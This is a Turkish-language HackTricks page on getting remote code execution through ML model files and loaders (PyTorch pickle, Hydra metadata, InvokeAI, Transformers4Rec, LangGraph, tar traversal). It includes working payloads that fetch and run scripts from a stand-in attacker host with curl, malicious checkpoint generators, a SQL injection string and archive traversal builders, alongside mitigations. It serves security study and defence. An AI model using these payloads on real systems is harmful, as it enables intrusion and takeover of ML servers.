# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Modelleri yükleyerek RCE

Machine Learning modelleri genellikle ONNX, TensorFlow, PyTorch gibi farklı formatlarda paylaşılır. Bu modeller, kullanılmak üzere geliştiricilerin makinelerine veya production sistemlerine yüklenebilir. Modellerin normalde kötü amaçlı kod içermemesi gerekir, ancak modelin tasarlanmış bir özellik olarak sistemde arbitrary code çalıştırmak için kullanılabildiği veya model yükleme kütüphanesindeki bir güvenlik açığından yararlanılabildiği bazı durumlar vardır.

Aşağıdaki tabloda bu kategorideki örnek güvenlik açıkları listelenmiştir:

| **Framework / Tool**        | **Güvenlik Açığı (varsa CVE)**                                                    | **RCE Vektörü**                                                                                                                           | **Referanslar**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load` içinde güvensiz deserialization* **(CVE-2025-32434)**                                                              | Model checkpoint’indeki kötü amaçlı pickle, kod çalıştırılmasına yol açar (`weights_only` korumasını atlayarak)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kötü amaçlı model indirme kod çalıştırılmasına yol açar; management API’de Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` aracılığıyla güvensiz checkpoint deserialization **(CVE-2025-23298)**                                           | Güvenilmeyen checkpoint, `load_model_trainer_states_from_checkpoint` sırasında pickle reducer’ı tetikler → ML worker’da kod çalıştırma            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + güvensiz MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Kullanıcı denetimindeki `filter` anahtarı SQL/JSON-path sözdizimi ekler, `UNION SELECT` sahte bir checkpoint satırı oluşturur, ardından `msgpack` deserialization saldırganın seçtiği Python kodunu import edip çağırır | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (güvensiz YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML’den model yüklemek `yaml.unsafe_load` kullanır (kod çalıştırma) <br> **Lambda** katmanlı model yüklemek arbitrary Python code çalıştırır          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Özel hazırlanmış `.tflite` modeli integer overflow tetikler → heap corruption (olası RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` aracılığıyla model yüklemek, saldırganın `__reduce__` payload’unu içeren pickle’ı çalıştırır                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (güvensiz `np.load`) *tartışmalı*                                                                              | `numpy.load` varsayılan olarak pickled object array’lerine izin veriyordu – kötü amaçlı `.npy/.npz` kod çalıştırmayı tetikler                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelinin external-weights yolu dizin dışına çıkabilir (arbitrary file okuma) <br> Kötü amaçlı ONNX model tar arşivi arbitrary file’ların üzerine yazabilir (RCE’ye yol açar) | |
| ONNX Runtime (tasarım riski)  | *(CVE yok)* ONNX custom ops / control flow                                                                                    | Custom operator içeren bir model, saldırganın native code’unun yüklenmesini gerektirir; karmaşık model graph’ları istenmeyen hesaplamalar çalıştırmak için mantığı kötüye kullanabilir   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` etkinken model-load API’yi kullanmak, dosya yazmak için relative path traversal’a izin verir (ör. RCE için `.bashrc` dosyasının üzerine yazmak)    | |
| **GGML (GGUF formatı)**      | **CVE-2024-25664 … 25668** (birden çok heap overflow)                                                                         | Hatalı biçimlendirilmiş GGUF model dosyası parser’da heap buffer overflow’larına neden olur ve kurbanın sisteminde arbitrary code execution sağlar                     | |
| **Keras (eski formatlar)**   | *(Yeni CVE yok)* Legacy Keras H5 modeli                                                                                         | Lambda katmanı içeren kötü amaçlı HDF5 (`.h5`) modeli, yüklenirken kod çalıştırmaya devam eder (Keras safe_mode eski formatı kapsamaz – “downgrade attack”) | |
| **Diğerleri** (genel)        | *Tasarım kusuru* – Pickle serialization                                                                                         | Birçok ML tool (ör. pickle tabanlı model formatları, Python `pickle.load`), önlem alınmadıkça model dosyalarına gömülü arbitrary code çalıştırır | |
| **NeMo / uni2TS / FlexTok (Hydra)** | `hydra.utils.instantiate()` işlevine güvenilmeyen metadata aktarılması **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Saldırganın denetimindeki model metadata/config, `_target_` değerini arbitrary callable’a (ör. `builtins.exec`) ayarlar → “güvenli” formatlarda bile (`.safetensors`, `.nemo`, repo `config.json`) yükleme sırasında çalıştırılır | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ayrıca [PyTorch](https://github.com/pytorch/pytorch/security) tarafından kullanılanlar gibi, `weights_only=True` ile yüklenmedikleri takdirde sistemde arbitrary code çalıştırmak için kullanılabilecek Python pickle tabanlı modeller de vardır. Bu nedenle pickle tabanlı her model, yukarıdaki tabloda listelenmemiş olsa bile bu tür saldırılara karşı özellikle savunmasız olabilir.

### Hydra metadata → RCE (safetensors ile bile çalışır)

`hydra.utils.instantiate()`, bir configuration/metadata nesnesindeki noktalı `_target_` değerlerini import eder ve çağırır. Hugging Face Transformers gibi kütüphaneler **güvenilmeyen model metadata** değerlerini `instantiate()` işlevine aktardığında saldırgan, model yüklenirken hemen çalıştırılacak bir callable ve argümanlar sağlayabilir (pickle gerekmez).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload örneği (`.nemo` `model_config.yaml`, repo `config.json` veya `.safetensors` içindeki `__metadata__` ile çalışır):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Önemli noktalar:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders ve FlexTok loaders içinde model başlatılmadan önce tetiklenir.
- Hydra’nın string block-list’i alternatif import path’leri (ör. `enum.bltns.eval`) veya uygulama tarafından çözümlenen adlar (ör. `nemo.core.classes.common.os.system` → `posix`) kullanılarak atlatılabilir.<sup>[[14]](#references)</sup>
- FlexTok ayrıca string hâline getirilmiş metadata’yı `ast.literal_eval` ile ayrıştırır; bu da Hydra çağrısından önce DoS’a (CPU/bellek kullanımında aşırı artışa) olanak tanır.

### 🆕  InvokeAI’de `torch.load` üzerinden RCE (CVE-2024-12029)

`InvokeAI`, Stable-Diffusion için popüler bir açık kaynak web arayüzüdür. **5.3.1 – 5.4.2** sürümleri, kullanıcıların rastgele URL’lerden model indirip yüklemesine olanak tanıyan `/api/v2/models/install` REST endpoint’ini kullanıma açar.<sup>[[1]](#references)</sup>

Endpoint dahili olarak sonunda şunu çağırır:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

When sağlanan dosya bir **PyTorch checkpoint (`*.ckpt`)** olduğunda, `torch.load` **pickle deserialization** işlemi gerçekleştirir. İçerik doğrudan kullanıcı tarafından kontrol edilen URL'den geldiği için saldırgan, checkpoint içine özel bir `__reduce__` metoduna sahip kötü amaçlı bir nesne ekleyebilir; bu metot **deserialization sırasında** çalıştırılarak InvokeAI sunucusunda **remote code execution (RCE)** sağlar.

Bu güvenlik açığına **CVE-2024-12029** atanmıştır (CVSS 9.8, EPSS %61.17).

#### Exploitation adımları

1. Kötü amaçlı bir checkpoint oluşturun:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. `payload.ckpt` dosyasını kontrolünüzdeki bir HTTP sunucusunda barındırın (ör. `http://ATTACKER/payload.ckpt`).
3. Güvenlik açığı bulunan endpoint'i tetikleyin (kimlik doğrulama gerekmez):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI dosyayı indirdiğinde `torch.load()` çağrılır → `os.system` gadget'ı çalışır ve saldırgan, InvokeAI işleminin bağlamında kod yürütme elde eder.

Hazır exploit: **Metasploit** modülü `exploit/linux/http/invokeai_rce_cve_2024_12029` tüm akışı otomatikleştirir.<sup>[[3]](#references)</sup>

#### Koşullar

•  InvokeAI 5.3.1-5.4.2 (scan bayrağının varsayılan değeri **false**)
•  `/api/v2/models/install` saldırgan tarafından erişilebilir olmalı
•  İşlemin shell komutlarını yürütme izinleri olmalı

#### Azaltıcı önlemler

* **InvokeAI ≥ 5.4.3** sürümüne yükseltin – yama, varsayılan olarak `scan=True` ayarını yapar ve serileştirme işlemini geri almadan önce kötü amaçlı yazılım taraması gerçekleştirir.<sup>[[2]](#references)</sup>
* Checkpoint'leri programlı olarak yüklerken `torch.load(file, weights_only=True)` veya yeni [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) yardımcısını kullanın.
* Model kaynakları için izin listeleri / imzalar uygulayın ve hizmeti en az ayrıcalıkla çalıştırın.

> ⚠️ Güvenilmeyen kaynaklardan serileştirme işlemiyle yüklenen Python pickle tabanlı **herhangi bir** biçimin (birçok `.pt`, `.pkl`, `.ckpt`, `.pth` dosyası dahil) doğası gereği güvensiz olduğunu unutmayın.

---

Eski InvokeAI sürümlerini reverse proxy arkasında çalıştırmaya devam etmeniz gerekiyorsa, geçici bir azaltıcı önlem örneği:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec’te güvenli olmayan `torch.load` üzerinden RCE (CVE-2025-23298)

NVIDIA’nın Merlin’in bir parçası olan Transformers4Rec’i, kullanıcı tarafından sağlanan yollar üzerinde doğrudan `torch.load()` çağrısı yapan güvenli olmayan bir checkpoint yükleyicisi içeriyordu. `torch.load`, Python `pickle`’a dayandığından saldırganın kontrolündeki bir checkpoint, deserialization sırasında bir reducer aracılığıyla rastgele kod çalıştırabilir.<sup>[[5]](#references)</sup>

Savunmasız yol (düzeltme öncesi): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Bunun RCE’ye yol açma nedeni: Python pickle’da bir nesne, bir callable ve argümanlar döndüren bir reducer (`__reduce__`/`__setstate__`) tanımlayabilir. Callable, unpickling sırasında çalıştırılır. Böyle bir nesne checkpoint’te bulunuyorsa herhangi bir ağırlık kullanılmadan önce çalışır.

Minimal kötü amaçlı checkpoint örneği:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Teslimat vektörleri ve etki alanı:
- Repo'lar, bucket'lar veya artifact registry'leri üzerinden paylaşılan trojanize checkpoint/model'ler
- Checkpoint'leri otomatik yükleyen otomatik resume/deploy pipeline'ları
- Çalıştırma, genellikle yükseltilmiş ayrıcalıklara sahip (ör. container'larda root) training/inference worker'larının içinde gerçekleşir

Düzeltme: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802), doğrudan `torch.load()` kullanımını `transformers4rec/utils/serialization.py` içinde uygulanan, kısıtlı ve allow-list kullanan bir deserializer ile değiştirdi. Yeni loader, türleri/alanları doğrular ve yükleme sırasında keyfi callable'ların çağrılmasını önler.<sup>[[7]](#references)</sup>

PyTorch checkpoint'lerine özel savunma önerileri:
- Güvenilmeyen verileri unpickle etmeyin. Mümkün olduğunda [Safetensors](https://huggingface.co/docs/safetensors/index) veya ONNX gibi çalıştırılabilir olmayan formatları tercih edin.
- PyTorch serialization kullanmanız gerekiyorsa `weights_only=True` seçeneğinin etkin olduğundan emin olun (daha yeni PyTorch sürümlerinde desteklenir) veya Transformers4Rec yamasına benzer, özel bir allow-list kullanan unpickler kullanın.<sup>[[4]](#references)</sup>
- Model kaynağını/imzalarını doğrulayın ve deserialization işlemini sandbox içinde gerçekleştirin (seccomp/AppArmor; root olmayan kullanıcı; kısıtlı FS ve dış ağa çıkış yok).
- Checkpoint yüklenirken ML servislerinden beklenmeyen child process'ler başlatılıp başlatılmadığını izleyin; `torch.load()`/`pickle` kullanımını takip edin.

POC ve güvenlik açığı/yama referansları:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Yama öncesi güvenlik açığı bulunan loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Kötü amaçlı checkpoint POC'si: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Yama sonrası loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Örnek – kötü amaçlı bir PyTorch modeli oluşturma

- Modeli oluşturun:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Modeli yükleyin:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’in FaceDetection-DSFD ürünü, kullanıcı denetimindeki verilerin deserialize edildiği bir `resnet` endpoint’i sunar. ZDI, uzaktaki bir saldırganın kurbanı kötü amaçlı bir sayfa/dosya yüklemeye zorlayabileceğini, bu sayfanın/dosyanın endpoint’e hazırlanmış bir serialized blob göndermesini sağlayabileceğini ve böylece `root` olarak deserialization’ı tetikleyerek sistemi tamamen ele geçirebileceğini doğruladı.

Exploit akışı tipik pickle kötüye kullanımını izler:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Deserialization sırasında erişilebilen herhangi bir gadget (constructor'lar, `__setstate__`, framework callback'leri vb.), taşıma yöntemi HTTP, WebSocket veya izlenen bir dizine bırakılan bir dosya olsun, aynı şekilde weaponize edilebilir.



### LangGraph checkpointer SQLi → MessagePack RCE

Bu attack chain ilginçtir çünkü saldırganın **kötü amaçlı bir model dosyası yüklemesi gerekmez**. Bunun yerine uygulama bir **AI-agent kalıcılık API'si** (`get_state_history(..., filter=...)`) sunar ve kullanıcı girdisi checkpointer sorgu oluşturucusuna ulaşır.

#### 1. Metadata filtrelerinde yapısal SQLi

Savunmasız bir SQLite örüntüsü şöyle görünüyordu:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Değer daha sonra bağlanır, ancak `query_key`, **JSON path string** içine birleştirilir; bu nedenle sözlük anahtarındaki bir `'`, `'$.{query_key}'` ifadesinden çıkarak SQL enjekte eder. Aynı ders **JSON path'ler, identifier'lar, operator'lar, `LIMIT` ve TTL alanları** için de geçerlidir: placeholder'lar değerleri korur, sorgunun yapısal sözdizimini değil.

#### 2. `UNION SELECT`, yalnızca veri çalmakla kalmayıp sonraki sink'leri de hedefleyebilir

Sorgu, daha sonra şu şekilde tüketilen `type` ve serialize edilmiş `checkpoint` baytlarını döndürür:

```python
self.serde.loads_typed((type, checkpoint))
```

Bu, `WHERE` koşulundaki bir SQLi'nin **sahte bir sonuç satırı** enjekte edebileceği anlamına gelir:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Daha sonraki kod seçili bir sütunu ayrıştırıyor, deserialize ediyor, yazıyor veya çalıştırıyorsa bu sütunları ilgili sink'lerle eşleştirin. Bu durumda sahte satır, SQLi'yi **saldırganın kontrolündeki deserialization** işlemine dönüştürür.

#### 3. Güvenli olmayan MessagePack extension hook'ları, kod gadget'larıyla eşdeğerdir

LangGraph'ın `msgpack` yolu, iç içe geçmiş bir tuple'ı açan ve şu işlemi gerçekleştiren özel bir extension hook kullanıyordu:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Yani, `("os", "system", "id > /tmp/pwned")` ifadesine eşdeğer bir MessagePack extension object, `os` modülünü içe aktarır, `system` öğesini çözümler ve komutu çalıştırır. AI framework'lerini incelerken dinamik import, reflection veya keyfi callable dispatch işlemleri yapan **custom MessagePack/JSON/pickle revivers**'ı denetleyin.

#### 4. Agent framework'leri için pratik denetim yöntemi

Kullanıcı denetimindeki şu girdilerin ulaştığı noktaları inceleyin:
- state history / memory / replay / checkpoint listeleme API'leri
- SQL veya Redis sorgu parçaları oluşturan yapılandırılmış filter builder'lar
- custom deserializer'lar (`pickle`, `msgpack`, `json` object hook'ları, YAML constructor'ları)
- persistence layer'dan dönen satırlara güvenen recovery yolları

Bu özel zincir, güvenilmeyen kullanıcıların `filter` değerini denetleyebildiği SQLite veya Redis checkpointer'ları kullanan, kendi barındırdıkları LangGraph kurulumlarını etkiledi. Açıklamada belirtilen yamalı sürümler `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` ve `langgraph-checkpoint 4.0.1+` idi.<sup>[[15]](#references)</sup>

## Modellerden Path Traversal

[**Bu blog yazısında**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) belirtildiği gibi, farklı AI framework'lerinin kullandığı model formatlarının çoğu, genellikle `.zip` olmak üzere arşiv tabanlıdır. Dolayısıyla, bu formatları kötüye kullanarak Path Traversal saldırıları gerçekleştirmek ve modelin yüklendiği sistemdeki rastgele dosyaları okumak mümkün olabilir.<sup>[[16]](#references)</sup>

Örneğin, aşağıdaki kodla yüklendiğinde `/tmp` dizininde bir dosya oluşturacak bir model oluşturabilirsiniz:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ya da aşağıdaki kodla, yüklendiğinde `/tmp` dizinine symlink oluşturacak bir model oluşturabilirsiniz:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Derinlemesine inceleme: Keras .keras deserialization ve gadget hunting

.keras dahili yapısı, Lambda-layer RCE, ≤ 3.8 sürümlerindeki arbitrary import sorunu ve allowlist içindeki düzeltme sonrası gadget keşfi hakkında odaklı bir kılavuz için bkz.:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – InvokeAI güvenilmeyen verilerin serileştirilmesinin kaldırılması"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI yama commit'i 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit modülü belgeleri](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load için güvenlik değerlendirmeleri](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298 NVIDIA Merlin'de uzaktan kod yürütme elde etme](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI duyurusu: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec yama commit'i b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Yama öncesi savunmasız loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Kötü amaçlı checkpoint PoC'si (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Yama sonrası loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Modern AI/ML formatları ve kütüphaneleriyle uzaktan kod yürütme](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate belgeleri](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit'i (RCE uyarısı)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi'den RCE'ye: LangGraph'in Checkpointer'ını istismar etme](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip hatalarını yüksek değerli AI/ML bounty'lerine dönüştürme](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
